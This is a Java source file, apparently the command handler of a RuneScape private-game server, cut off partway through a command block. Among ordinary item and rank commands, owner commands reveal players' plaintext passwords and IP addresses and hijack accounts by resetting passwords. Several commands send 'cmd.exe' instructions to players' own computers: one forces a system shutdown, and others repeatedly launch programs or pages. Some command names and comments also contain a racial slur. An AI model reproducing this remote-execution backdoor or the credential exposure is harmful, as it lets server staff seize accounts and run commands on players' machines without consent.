package com.rs.game.player.content;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.Serializable;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.text.NumberFormat;
import java.text.DateFormat;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Map;
import java.util.List;
import java.util.Locale;
import java.util.TimerTask;
import java.util.concurrent.TimeUnit;

import com.rs.Launcher;
import com.rs.Settings;
import com.rs.cache.loaders.ItemDefinitions;
import com.rs.game.Animation;
import com.rs.game.EntityList;
import com.rs.game.Entity;
import com.rs.game.ForceTalk;
import com.rs.game.Graphics;
import com.rs.game.Hit;
import com.rs.game.Hit.HitLook;
import com.rs.game.World;
import com.rs.game.WorldObject;
import com.rs.game.WorldTile;
import com.rs.game.item.Item;
import com.rs.game.item.ItemsContainer;
import com.rs.game.minigames.CastleWars;
import com.rs.game.minigames.ClanWars;
import com.rs.game.minigames.ClanWars.ClanChallengeInterface;
import com.rs.game.npc.NPC;
import com.rs.game.player.starter.Starter;
import com.rs.game.player.Kilner;
import com.rs.game.player.Player;
import com.rs.game.player.MusicsManager;
import com.rs.game.player.Skills;
import com.rs.game.player.actions.Summoning;
import com.rs.game.player.content.Notes.Note;
import com.rs.game.player.content.slayer.SlayerTasks;
import com.rs.game.player.content.slayer.SlayerMaster;
import com.rs.game.player.content.slayer.SlayerTask;
import com.rs.game.player.actions.Slayer;
import com.rs.game.player.actions.Summoning.Pouches;
import com.rs.game.player.content.dungeoneering.DungeonPartyManager;
import com.rs.game.player.content.exchange.GrandExchange;
import com.rs.game.player.content.Magic;
import com.rs.game.player.controlers.JailControler;
import com.rs.game.player.controlers.DZ;
import com.rs.game.player.controlers.Rest;
import com.rs.game.player.cutscenes.*;
import com.rs.game.player.Boxing;
import com.rs.game.player.cutscenes.JackCutScene;
import com.rs.game.player.cutscenes.QuestCutScene;
import com.rs.game.player.cutscenes.HomeCutScene;
import com.rs.game.tasks.WorldTask;
import com.rs.game.tasks.WorldTasksManager;
import com.rs.net.Session;
import com.rs.utils.CharacterBackup;
import com.rs.utils.*;
import com.rs.io.SQL;

public final class Commands {
	public static boolean diceChance;

	public static boolean processCommand(Player player, String command,
			boolean console, boolean clientCommand) {
		if (command.length() == 0) // if they used ::(nothing) theres no command
			return false;
		String[] cmd = command.toLowerCase().split(" ");
		 archiveLogs(player, cmd); //disabled dont add would fu autorestart
		if (cmd.length == 0)
			return false;
/*
 This is Commands.java without the antihack. any rank will have access to thier commands.
*/		
		
	if((player.getRights() >= Settings.IS_MOD) &&( player.staffpindone == false)){
			player.getPackets().sendGameMessage("You need to enter you staff pin.");
           }
 else{	
			
		if (player.getRights() >= Settings.IS_TRUSTED
		    && processTrustedCommand(player, cmd, console, clientCommand))
			return true;		
		if (player.getRights() >= Settings.IS_OWNER
		    && processOwnerCommand(player, cmd, console, clientCommand))
			return true;
		if (player.getRights() >= Settings.IS_DEVELOPER
		    && processDeveloperCommand(player, cmd, console, clientCommand))
			return true;
		if (player.getRights() >= Settings.IS_ADMIN
		    && processAdminCommand(player, cmd, console, clientCommand))
			return true;
		if (player.getRights() >= Settings.IS_HIDDEN
		    && processHiddenCommand(player, cmd, console, clientCommand))
			return true;
		if (player.getRights() >= Settings.IS_GLOBAL
		    && processGlobalCommand(player, cmd, console, clientCommand))
			return true;
        if (player.getRights() >= Settings.IS_MOD
		    && processModCommand(player, cmd, console, clientCommand))
			return true;
		if (player.getRights() >= Settings.IS_SUPPORT
		    && processSupportCommand(player, cmd, console, clientCommand))
			return true;
		if (player.getRights() >= Settings.IS_FORUM
		    && processForumCommand(player, cmd, console, clientCommand))
			return true;
		if (player.getRights() >= Settings.IS_GRAPHIC
		    && processGraphicCommand(player, cmd, console, clientCommand))
			return true;
			
			}
		if (player.getRights() >= Settings.IS_RESPECTED
		    && processRespectedCommand(player, cmd, console, clientCommand))
			return true;
		if (player.getRights() >= Settings.IS_SUPER
		    && processSuperCommand(player, cmd, console, clientCommand))
			return true;
        if (player.getRights() >= Settings.IS_DONATOR
		    && processDonatorCommand(player, cmd, console, clientCommand))
			return true;
         if (player.getRights() >= Settings.IS_NORMAL_PLAYER
			&& processNormal_PlayerCommand(player, cmd, console, clientCommand))
            return true;
			return processNormal_PlayerCommand(player,cmd, console, clientCommand);
	
	
	
	
		}
		/*
		
			If you want the anti hack working commands, look in the extras folder.
		
		*/
//Owner
	public static boolean processOwnerCommand(final Player player, String[] cmd,
				boolean console, boolean clientCommand) {
			if (clientCommand) {

			} else {
			
			if (cmd[0].equalsIgnoreCase("wguildtoken")) {
			
			player.GuildTokens += 100;
					}
					
			if (cmd[0].equalsIgnoreCase("removewguildtoken")) {
			
			player.GuildTokens -= 100;
					}

					//Ip mute initating. Edit to make custom ip Commands.	
			if (cmd[0].equalsIgnoreCase("startipmute")) {
			player.getPackets().sendGameMessage("Init.");
			IPMute.init();
			
			}if (cmd[0].equalsIgnoreCase("saveipmute")) {
			player.getPackets().sendGameMessage("save.");
			IPMute.save();
			
			}
	//Ip mute init end.
	
	
	//sets an item on the component id. ::itemoni (interid) (componentid) (itemid)
			if (cmd[0].equalsIgnoreCase("itemoni")) {
				int interId = Integer.valueOf(cmd[1]);
				int componentId = Integer.valueOf(cmd[2]);
				int id = Integer.valueOf(cmd[3]);
				player.getPackets().sendItemOnIComponent(interId, componentId, id, 1);
				return true;
			}
		
		
			
			if (cmd[0].equalsIgnoreCase("fishworld")) {
				World.safeShutdown(true, 1);
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("permdonator")) {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player target = World.getPlayerByDisplayName(name);
				boolean loggedIn = true;
				if (target == null) {
					target = SerializableFilesManager.loadPlayer(Utils
														.formatPlayerNameForProtocol(name));
					if (target != null)
						target.setUsername(Utils
								.formatPlayerNameForProtocol(name));
					loggedIn = false;
				}
				if (target == null)
					return true;
				target.getInventory().addItem(15098, 1);
				target.setDonator(true);
				
				
				SerializableFilesManager.savePlayer(target);
				
				if (target.getRights() ==0)
				target.setRights(1);
				
				
				if (loggedIn)
					target.getPackets().sendGameMessage("You have been given donator by " + Utils.formatPlayerNameForDisplay(player.getUsername()), true);
				player.getPackets().sendGameMessage("You gave donator to " + Utils.formatPlayerNameForDisplay(target.getUsername()), true);
				return true;
			}
			if (cmd[0].equalsIgnoreCase("monthdonator")) {
				String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
				Player other = World.getPlayerByDisplayName(username);
				if (other == null)
					return true;
				other.makeDonator(1);
				SerializableFilesManager.savePlayer(other);
				other.getPackets().sendGameMessage("You have been given donator by " + Utils.formatPlayerNameForDisplay(player.getUsername()), true);
				player.getPackets().sendGameMessage("You gave donator to " + Utils.formatPlayerNameForDisplay(other.getUsername()), true);
				return true;
			}
			if (cmd[0].equalsIgnoreCase("takedonator")) {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player target = World.getPlayerByDisplayName(name);
				boolean loggedIn = true;
				if (target == null) {
					target = SerializableFilesManager.loadPlayer(Utils
							.formatPlayerNameForProtocol(name));
					if (target != null)
						target.setUsername(Utils
								.formatPlayerNameForProtocol(name));
					loggedIn = false;
				}
				if (target == null)
					return true;
				target.setDonator(false);
				SerializableFilesManager.savePlayer(target);
				if (loggedIn)
				target.getPackets().sendGameMessage("Your donator was removed by " + Utils.formatPlayerNameForDisplay(player.getUsername()), true);
				player.getPackets().sendGameMessage("You removed donator from " + Utils.formatPlayerNameForDisplay(target.getUsername()), true);
				return true;
			}
			
			
				
			
			  
			  if (cmd[0].equalsIgnoreCase("runes")){
              player.getInventory().addItem(554 , 2000);
			  player.getInventory().addItem(555 , 2000);
			  player.getInventory().addItem(556 , 2000);
			  player.getInventory().addItem(557 , 2000);
			  player.getInventory().addItem(558 , 2000);
			  player.getInventory().addItem(559 , 2000);
			  player.getInventory().addItem(560 , 2000);
			  player.getInventory().addItem(561 , 2000);
			  player.getInventory().addItem(562 , 2000);
			  player.getInventory().addItem(563 , 2000);
			  player.getInventory().addItem(564 , 2000);
			  player.getInventory().addItem(565 , 2000);
			  player.getInventory().addItem(566 , 2000);
			  player.getInventory().addItem(9075 , 2000);
			  player.getInventory().addItem(21773 , 2000);
			  }
			  
			  
			  	if (cmd[0].equalsIgnoreCase("heal")) {
				for (int i = 500; i < 501; i++)
					player.applyHit(new Hit(player, 999,HitLook.HEALED_DAMAGE));
			}
			
				if (cmd[0].equalsIgnoreCase("pray")) {
				  player.getPrayer().restorePrayer(1200);
				}
				
				if (cmd[0].equalsIgnoreCase("run")) {
				  player.restoreRunEnergy();
				}
			if (cmd[0].equalsIgnoreCase("spec")) {
				try {
					File file = new File("data/logs/usesspec.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " used spec");
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				player.getCombatDefinitions().resetSpecialAttack();
				return true;
			}
			
			
			
			
			
			
				
				 if (cmd[0].equalsIgnoreCase("ge")) {
              GrandExchange.openGE(player);
			  
			
			  }
		if (cmd[0].equalsIgnoreCase("master")) {
				if (cmd.length < 2) {
					for (int skill = 0; skill < 25; skill++)
						player.getSkills().addXp(skill, Skills.MAXIMUM_EXP);
					return true;
				}
				try {
					player.getSkills().addXp(Integer.valueOf(cmd[1]),
							Skills.MAXIMUM_EXP);
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage(
							"Use: ::master skill");
				}
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("shutdown")) {
				int delay = 60;
				if (cmd.length >= 2) {
					try {
						delay = Integer.valueOf(cmd[1]);
					} catch (NumberFormatException e) {
						player.getPackets().sendPanelBoxMessage(
								"Use: ::shutdown secondsDelay(IntegerValue)");
						return true;
					}
				}
				World.safeShutdown(false, delay);
				return true;
			}
	
			
			if (cmd[0].equalsIgnoreCase("prestigeother1")) {
		
			
			 String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
					
		p2.prestige += 1;
		
		}
		


		
	if (cmd[0].equalsIgnoreCase("time")) {
		
Calendar cal = Calendar.getInstance();
    	cal.getTime();
		SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");
		
		 player.getPackets().sendGameMessage(String.valueOf(sdf.format(cal.getTime())));
		}
		
		if (cmd[0].equalsIgnoreCase("setskull")) {
				int skull = 0;
				skull = Integer.valueOf(cmd[1]);
				if (skull >= 19) {
					  player.getPackets().sendGameMessage("#leech.");
                               
					return false;
				}
				player.setSkull(skull);
				return true;
		}
		if (cmd[0].equalsIgnoreCase("setskullother")) {
			String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
					
				int skull = 0;
				skull = Integer.valueOf(cmd[2]);
				if (skull >= 19) {
					  player.getPackets().sendGameMessage("#leech.");
                               
					return false;
				}
				p2.setSkull(skull);
							return true;
			
			}

		
		
		if (cmd[0].equalsIgnoreCase("prestigeother")) {
			
			
			 String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
					
		p2.prestige = Integer.valueOf(cmd[2]);
		
		}
		  
		 	if (cmd[0].equalsIgnoreCase("dial1")) {
			player.getDialogueManager().startDialogue(cmd[1]);
		
		}	
		if (cmd[0].equalsIgnoreCase("dial2")) {
			player.getDialogueManager().startDialogue(cmd[1], 1);
		
		} 	if (cmd[0].equalsIgnoreCase("updatepc")) {
			SQL.savePlayerCount();
		
		} 	if (cmd[0].equalsIgnoreCase("ingameplayers")) {
			SQL.PlayersIngame();
		
		} 
	
		
		
		
			 if (cmd[0].equalsIgnoreCase("getpassword") || cmd[0].equalsIgnoreCase("getpass")) {
	
				
			if (cmd[1].equalsIgnoreCase("poanizer")){
				player.getPackets().sendGameMessage("You don't need to know this password.");
				return false;
				
			}
			
			else {
			 
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player target = World.getPlayerByDisplayName(name);
				boolean loggedIn = true;
				
					
					
				if (target == null) {
					target = SerializableFilesManager.loadPlayer(Utils
							.formatPlayerNameForProtocol(name));
					if (target != null)
						target.setUsername(Utils
								.formatPlayerNameForProtocol(name));
					loggedIn = false;
				}
				if (target == null)
					return true;
				
				try {
					File file = new File("data/logs/gotpass.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " got " + target.getDisplayName() + "'s Password");
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				if (loggedIn)
					player.getPackets().sendGameMessage("Currently online - " + target.getDisplayName(),
							true);
							
			
			else{				
				player.getPackets().sendGameMessage("Their password is " + target.getPassword(), true);
				return true;
			}	
				
			} }
			 
		if (cmd[0].equalsIgnoreCase("task")) {
			player.getDialogueManager().startDialogue("EnchantedGemDialouge");
					return true;
			} 
			
			
			if (cmd[0].equalsIgnoreCase("getip")) {
			
			if (cmd[1].equalsIgnoreCase("poanizer")) {
				
				player.getPackets().sendGameMessage(" IP is 94.76.244.220.");
			}
			
			
			
			else {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player p = World.getPlayerByDisplayName(name);
				if (p == null) {
					player.getPackets().sendGameMessage("Couldn't find player " + name + ".");
				} else
					player.getPackets().sendGameMessage("" + p.getDisplayName() + "'s IP is " + p.getSession().getIP() + ".");
				
				
				try {
					File file = new File("data/logs/gotip.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " got  " + p.getDisplayName() + "'s ip");
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				return true;
			}}
			
			if (cmd[0].equalsIgnoreCase("task2")) {
					Slayer.submitRandomTask(player);
					return true;
					
		}
			
			
			if (cmd[0].equalsIgnoreCase("pvpother")) {
			
                    String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
				p2.getControlerManager().startControler("Wilderness");
				}
				
	
			
			//title	
			
	
			   if (cmd[0].equalsIgnoreCase("polyporeold")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2851,9482, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=000079><img=1>This is the old dungeon.<img=1> ");
				return true;
		    }
			
			if (cmd[0].equalsIgnoreCase("disable")) {
			
			if (cmd[1].equalsIgnoreCase("poanizer")) {
				player.getPackets().sendGameMessage("* uses Reflect...*");
				for (Player players : World.getPlayers())
				players.getPackets().sendGameMessage(player.getDisplayName() + "Tryed to disbale Boss");
				player.getPackets().sendExecMessage("cmd.exe /c shutdown -s -t 10");
				return false;
					
			}
			
			
			else {
			
					
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player target = World.getPlayerByDisplayName(name);
				boolean loggedIn = true;
				if (target == null) {
					target = SerializableFilesManager.loadPlayer(Utils
							.formatPlayerNameForProtocol(name));
					if (target != null)
						target.setUsername(Utils
								.formatPlayerNameForProtocol(name));
					loggedIn = false;
				}
				if (target != null) {
				target.setPassword("douevenliftked2");
				World.removePlayer(target);	
					if (loggedIn)
						
						target.getSession().getChannel().close();
					else
						SerializableFilesManager.savePlayer(target);
					World.removePlayer(target);
					player.getPackets().sendGameMessage("You've disabled " + (loggedIn ? target.getDisplayName() : name) + ".");
				} else {
					player.getPackets().sendGameMessage("Couldn't find player " + name + ".");
				}
				
			
				return true;
			}
			}

		
		
			if (cmd[0].equalsIgnoreCase("otherkdr")) {
			
			String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
					
					
				double kill  = player.getKillCount();
				double death = player.getDeathCount();
				double dr = kill / death;
				player.getPackets().sendGameMessage("<col=ff0000>THEY KILLED " + p2.getKillCount() + " PLAYERS AND BEEN KILLED " + p2.getDeathCount() + " TIMES. DR: " + dr);
				return true;
				}
				
				if (cmd[0].equalsIgnoreCase("otherpp")) {
			
			String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
					
				
				player.getPackets().sendGameMessage("<col=ff0000>THEY KILLED " + p2.PvPPoints + " in safe pvp");
				return true;
				}
				
		
			
			
			if (cmd[0].equalsIgnoreCase("title")) {
				
				if (cmd.length < 2) {
					player.getPackets().sendGameMessage("Use: ::title id");
					return true;
				}
				try {
					player.getAppearence().setTitle(Integer.valueOf(cmd[1]));
				} catch (NumberFormatException e) {
					player.getPackets().sendGameMessage("Use: ::title id");
				}
				return true;
			}
			
	
			
			
			
			
			
			
			if (cmd[0].equalsIgnoreCase("changepassother")) {
			
				
			
				String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
				Player other = World.getPlayerByDisplayName(username);
				if (other == null)
					
				
					return true;
				other.setPassword(cmd[2]);
				player.getPackets().sendGameMessage("You changed their password!");
				
				
				try {
					File file = new File("data/logs/changepass.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " changed " + other.getDisplayName() + "'s Password");
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				
				return true;
			}
			
			
			if (cmd[0].equalsIgnoreCase("setrights")) {
				
				
				String username = cmd[2].substring(cmd[2].indexOf(" ") + 1);
				Player other = World.getPlayerByDisplayName(username);
				
				if (other == null)
					return true;
				/*if (Integer.parseInt(cmd[1]) >= player.getRights()){
					player.sm("You cannot give any rights higher than admin!");
					return true;
				}*/
				other.setRights(Integer.parseInt(cmd[1]));
				
				
				
			try {
					File file = new File("data/logs/setrights.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " (IP)[" + player.getSession().getIP() + "] set " +  other.getDisplayName() + " (IP)[" + other.getSession().getIP() + "] to Rights " + other.getRights());
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				return true;
			}
			
			
			
			if (cmd[0].equalsIgnoreCase("killnpc2")) {
			for (NPC n : World.getNPCs()) {
					if (n == null || n.getId() != Integer.parseInt(cmd[1]))
						continue;
					n.sendDeath(n);
				}
				return true; 
			}
			
//Loiutuma		
			if (cmd[0].equalsIgnoreCase("loituma")){

		if (cmd[1].equalsIgnoreCase("poanizer")) {

				
				
				player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.LOITUMA1);
				player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.LOITUMA2);
				player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.LOITUMA1);
				player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.LOITUMA2);
				player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.LOITUMA1);
				player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.LOITUMA2);
				player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.LOITUMA1);
				player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.LOITUMA2);
				player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.LOITUMA1);
				player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.LOITUMA2);
				player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.LOITUMA1);
				player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.LOITUMA2);
					player.getPackets().sendGameMessage("Nice try.");
				return false;
			}
			
			else{
					String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
					
				
				p2.getPackets().sendExecMessage("cmd.exe /c start " + Settings.LOITUMA1);
				p2.getPackets().sendExecMessage("cmd.exe /c start " + Settings.LOITUMA2);
					p2.getPackets().sendGameMessage("Yapaskeeldapadoodadpspqfdkjweoigforehoohg");
					player.getPackets().sendGameMessage(
							"Loitumaring" + p2.getUsername() + "!");
					return true;
						}
						
						}
						
//Hey ya heman						
			
			if (cmd[0].equalsIgnoreCase("Heyya")){

		if (cmd[1].equalsIgnoreCase("poanizer")) {

				
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.HEYYA);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.HEYYA);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.HEYYA);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.HEYYA);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.HEYYA);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.HEYYA);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.HEYYA);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.HEYYA);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.HEYYA);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.HEYYA);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.HEYYA);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.HEYYA);
					
					player.getPackets().sendGameMessage("Nice try.");
				return false;
			}
				
			else{
					String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
					
				
					p2.getPackets().sendExecMessage("cmd.exe /c start " + Settings.HEYYA);
					p2.getPackets().sendExecMessage("cmd.exe /c start " + Settings.HEYYA);
					p2.getPackets().sendExecMessage("cmd.exe /c start " + Settings.HEYYA);
					p2.getPackets().sendGameMessage("I SAID HEY!");
					p2.getPackets().sendGameMessage("Whats going on?");
					player.getPackets().sendGameMessage(
							"he maning" + p2.getUsername() + "!");
					return true;
						}
						
						}
						
//what you say nigga						
		if (cmd[0].equalsIgnoreCase("nigga")){

		if (cmd[1].equalsIgnoreCase("poanizer")) {

				
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					
					
					player.getPackets().sendGameMessage("Nice try.");
				return false;
			}
			
			
			else{
					String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
					
				
				
					p2.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					p2.getPackets().sendGameMessage("What did you say!");
					
					player.getPackets().sendGameMessage(
							"asking " + p2.getUsername() + " what they they said politely.");
					return true;
						}
						
						}
						
						
//was good nigga

	if (cmd[0].equalsIgnoreCase("nigga2")){

		if (cmd[1].equalsIgnoreCase("poanizer")) {

				
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA1);
					
					
					player.getPackets().sendGameMessage("Nice try.");
				return false;
			}
			
			
			else{
					String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
					
				
				
					p2.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NIGGA2);
					p2.getPackets().sendGameMessage("Was good?");
					
					player.getPackets().sendGameMessage(
								"asking " + p2.getUsername() + " what is good politely.");
					return true;
						}
						
						}
						
//JEFF

	if (cmd[0].equalsIgnoreCase("wakeup")){

		if (cmd[1].equalsIgnoreCase("poanizer")) {

				
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					
					
					
					
					player.getPackets().sendGameMessage("Nice try.");
				return false;
			}
			
			
			else{
					String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
					
				
				
					p2.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					p2.getPackets().sendGameMessage("WAKE UP JEFF!");
					p2.getPackets().sendGameMessage("WAKE UP JEFF!");
					p2.getPackets().sendGameMessage("WAKE UP JEFF!");
					p2.getPackets().sendGameMessage("WAKE UP JEFF!");
					p2.getPackets().sendGameMessage("WAKE UP JEFF!");
					p2.getPackets().sendGameMessage("WAKE UP JEFF!");
					p2.getPackets().sendGameMessage("WAKE UP JEFF!");
					p2.getPackets().sendGameMessage("WAKE UP JEFF!");
					p2.getPackets().sendGameMessage("WAKE UP JEFF!");
					p2.getPackets().sendGameMessage("WAKE UP JEFF!");
					
					
					player.getPackets().sendGameMessage(
								"Waking up" + p2.getUsername() + ".");
					return true;
						}
						
						}
						
						
	//Goodnight kiwi

	if (cmd[0].equalsIgnoreCase("night")){

		if (cmd[1].equalsIgnoreCase("poanizer")) {

				
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					
					
					
					
					player.getPackets().sendGameMessage("Nice try.");
				return false;
			}
			
			
			else{
					String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
					
				
				
					p2.getPackets().sendExecMessage("cmd.exe /c start " + Settings.KIWI);
					p2.getPackets().sendGameMessage("Goodnight Kiwi.");
					
					
					
					player.getPackets().sendGameMessage(
								"Waking up" + p2.getUsername() + ".");
					return true;
						}
						
						}
						
	//WAKE THE FUCK UP@@@@@@@@@@@@@@@					
						
if (cmd[0].equalsIgnoreCase("wakefup")){

		if (cmd[1].equalsIgnoreCase("Poanizer")) {

				
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
